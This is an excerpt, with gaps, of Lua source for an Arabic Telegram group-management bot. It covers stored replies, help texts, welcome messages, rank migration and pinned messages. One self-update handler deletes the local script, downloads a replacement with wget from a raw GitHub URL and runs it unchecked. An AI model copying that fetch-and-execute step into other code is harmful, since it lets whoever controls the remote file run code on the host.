if #redod == 0 then
...
if not Bot(msg) and DevLeo:get(Tayku..'Rio:Lock:GpRd'..msg.chat_id_) then 
...
for k,v in pairs(redod) do
DevLeo:del(Tayku..'Rio:Text:GpTexts'..v..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Manager:GpRedod'..msg.chat_id_)
end
...
local redod = DevLeo:smembers(Tayku..'Rio:Manager:GpRed'..msg.chat_id_)
MsgRep = '᥀︙ردود المدير ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevLeo:get(Tayku.."Rio:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevLeo:get(Tayku.."Rio:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevLeo:get(Tayku.."Rio:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevLeo:get(Tayku.."Rio:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevLeo:get(Tayku.."Rio:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevLeo:get(Tayku.."Rio:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevLeo:get(Tayku.."Rio:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevLeo:get(Tayku.."Rio:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
...
for k,v in pairs(redod) do
DevLeo:del(Tayku..'Rio:Gif:GpRed'..v..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Voice:GpRed'..v..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Audio:GpRed'..v..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Photo:GpRed'..v..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Stecker:GpRed'..v..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Video:GpRed'..v..msg.chat_id_)
DevLeo:del(Tayku..'Rio:File:GpRed'..v..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Text:GpRed'..v..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Manager:GpRed'..msg.chat_id_)
end
...
local redod = DevLeo:smembers(Tayku.."Rio:Sudo:AllRed")
MsgRep = '᥀︙ردود المطور ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevLeo:get(Tayku.."Rio:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevLeo:get(Tayku.."Rio:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevLeo:get(Tayku.."Rio:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevLeo:get(Tayku.."Rio:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevLeo:get(Tayku.."Rio:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevLeo:get(Tayku.."Rio:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevLeo:get(Tayku.."Rio:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevLeo:get(Tayku.."Rio:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
...
for k,v in pairs(redod) do
DevLeo:del(Tayku.."Rio:Add:AllRed"..v)
DevLeo:del(Tayku.."Rio:Gif:AllRed"..v)
DevLeo:del(Tayku.."Rio:Voice:AllRed"..v)
DevLeo:del(Tayku.."Rio:Audio:AllRed"..v)
DevLeo:del(Tayku.."Rio:Photo:AllRed"..v)
DevLeo:del(Tayku.."Rio:Stecker:AllRed"..v)
DevLeo:del(Tayku.."Rio:Video:AllRed"..v)
DevLeo:del(Tayku.."Rio:File:AllRed"..v)
DevLeo:del(Tayku.."Rio:Text:AllRed"..v)
DevLeo:del(Tayku.."Rio:Sudo:AllRed")
end
...
DevLeo:set(Tayku..'Rio:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
...
DevLeo:set(Tayku..'Rio:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local TaykuTeam =  DevLeo:get(Tayku..'Rio:Help0'..msg.sender_user_id_)
if TaykuTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevLeo:del(Tayku..'Rio:Help0'..msg.sender_user_id_)
DevLeo:set(Tayku..'Rio:Help', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevLeo:set(Tayku..'Rio:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local TaykuTeam =  DevLeo:get(Tayku..'Rio:Help01'..msg.sender_user_id_)
if TaykuTeam == 'msg' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevLeo:del(Tayku..'Rio:Help01'..msg.sender_user_id_)
DevLeo:set(Tayku..'Rio:Help1', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevLeo:set(Tayku..'Rio:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local TaykuTeam =  DevLeo:get(Tayku..'Rio:Help21'..msg.sender_user_id_)
if TaykuTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevLeo:del(Tayku..'Rio:Help21'..msg.sender_user_id_)
DevLeo:set(Tayku..'Rio:Help2', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevLeo:set(Tayku..'Rio:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local TaykuTeam =  DevLeo:get(Tayku..'Rio:Help31'..msg.sender_user_id_)
if TaykuTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevLeo:del(Tayku..'Rio:Help31'..msg.sender_user_id_)
DevLeo:set(Tayku..'Rio:Help3', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevLeo:set(Tayku..'Rio:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local TaykuTeam =  DevLeo:get(Tayku..'Rio:Help41'..msg.sender_user_id_)
if TaykuTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevLeo:del(Tayku..'Rio:Help41'..msg.sender_user_id_)
DevLeo:set(Tayku..'Rio:Help4', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
DevLeo:set(Tayku..'Rio:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local TaykuTeam =  DevLeo:get(Tayku..'Rio:Help51'..msg.sender_user_id_)
if TaykuTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevLeo:del(Tayku..'Rio:Help51'..msg.sender_user_id_)
DevLeo:set(Tayku..'Rio:Help5', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevLeo:set(Tayku..'Rio:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local TaykuTeam =  DevLeo:get(Tayku..'Rio:Help61'..msg.sender_user_id_)
if TaykuTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevLeo:del(Tayku..'Rio:Help61'..msg.sender_user_id_)
DevLeo:set(Tayku..'Rio:Help6', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku.."Rio:WhyTube"..msg.chat_id_) 
return false  
end
if text == 'تعطيل اليوتيوب' and Manager(msg) then  
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل اليوتيوب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku.."Rio:WhyTube"..msg.chat_id_,true) 
return false  
end 
if text and text:match('^بحث (.*)$') and not DevLeo:get(Tayku.."Rio:WhyTube"..msg.chat_id_) then            
...
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙جاري تحديث سورس تايكو', 1, 'md') 
os.execute('rm -rf Tayku.lua') 
os.execute('wget https://raw.githubusercontent.com/Pixbbo/Tayku/master/Tayku.lua') 
dofile('Tayku.lua') 
...
local Users = DevLeo:smembers(Tayku.."User_Bot")
local Groups = DevLeo:smembers(Tayku..'Chek:Groups')
local Sudos = DevLeo:smembers(Tayku.."Sudo:User")
if DevLeo:get(Tayku..'Name:Bot') then
DevLeo:set(Tayku..'Rio:NameBot',(DevLeo:get(Tayku..'Name:Bot') or 'تايكو'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
DevLeo:sadd(Tayku..'Rio:Users',Users[i]) 
end
end
for i = 1, #Sudos do
DevLeo:sadd(Tayku..'Rio:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
DevLeo:sadd(Tayku..'Rio:Groups',Groups[i]) 
if DevLeo:get(Tayku.."Private:Group:Link"..Groups[i]) then
DevLeo:set(Tayku.."Rio:Groups:Links"..Groups[i],DevLeo:get(Tayku.."Private:Group:Link"..Groups[i]))
end
if DevLeo:get(Tayku.."Get:Welcome:Group"..Groups[i]) then
DevLeo:set(Tayku..'Rio:Groups:Welcomes'..Groups[i],DevLeo:get(Tayku.."Get:Welcome:Group"..Groups[i]))
end
local list2 = DevLeo:smembers(Tayku..'Constructor'..Groups[i])
for k,v in pairs(list2) do
DevLeo:sadd(Tayku.."Rio:Constructor:"..Groups[i], v)
end
local list3 = DevLeo:smembers(Tayku..'BasicConstructor'..Groups[i])
for k,v in pairs(list3) do
DevLeo:sadd(Tayku.."Rio:BasicConstructor:"..Groups[i], v)
end
local list4 = DevLeo:smembers(Tayku..'Manager'..Groups[i])
for k,v in pairs(list4) do
DevLeo:sadd(Tayku.."Rio:Managers:"..Groups[i], v)
end
local list5 = DevLeo:smembers(Tayku..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
DevLeo:sadd(Tayku.."Rio:Admins:"..Groups[i], v)
end
local list6 = DevLeo:smembers(Tayku..'Special:User'..Groups[i])
for k,v in pairs(list6) do
DevLeo:sadd(Tayku.."Rio:VipMem:"..Groups[i], v)
end
DevLeo:set(Tayku.."Rio:Lock:Bots"..Groups[i],"del") DevLeo:hset(Tayku.."Rio:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
...
for i,Lock in pairs(LockList) do
DevLeo:set(Tayku..Lock..Groups[i],true)
end
end
...
DevLeo:del(Tayku..'Rio:Text:BotWelcome')
DevLeo:del(Tayku..'Rio:Photo:BotWelcome')
return false
end 
...
DevLeo:del(Tayku..'Rio:Lock:BotWelcome')
return false
end 
...
DevLeo:set(Tayku..'Rio:Lock:BotWelcome',true)
return false
end 
...
DevLeo:del(Tayku..'Rio:Text:BotWelcome')
DevLeo:del(Tayku..'Rio:Photo:BotWelcome')
DevLeo:set(Tayku.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevLeo:get(Tayku.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevLeo:del(Tayku.."Rio:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ النص ارسل لي صورة الترحيب\n᥀︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevLeo:set(Tayku.."Rio:Text:BotWelcome",text) 
DevLeo:set(Tayku.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevLeo:get(Tayku.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
...
DevLeo:set(Tayku.."Rio:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
...
DevLeo:setex(Tayku.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
...
DevLeo:del(Tayku.."DevText")
end end
--     Source Tayku     --
if DevLeo:get(Tayku.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevLeo:del(Tayku.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevLeo:del(Tayku.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevLeo:set(Tayku..'Rio:ChText',texxt)
...
DevLeo:setex(Tayku.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)   
...
Text = [[
᥀︙[قناة السورس](https://t.me/lllEll0)
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/lllEll0&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source Tayku     --
...
Text = [[
᥀︙[مبرمج السورس](https://t.me/lllEll1)
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
DevLeo:incr(Tayku..'Rio:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevLeo:get(Tayku..'Rio:Lock:EditMsgs'..msg.chat_id_) and not Text and not RioConstructor(result) then
...
local GetMsgPin = DevLeo:get(Tayku..'Rio:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevLeo:del(Tayku..'Rio:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevLeo:del(Tayku..'Rio:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
...
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=Tayku,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevLeo:srem(Tayku..'Rio:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevLeo:srem(Tayku..'Rio:Groups',v)  
end
...
DevLeo:sadd(Tayku..'Rio:Groups',v)  
end end,nil) end
end
--     Source Tayku     --
end 
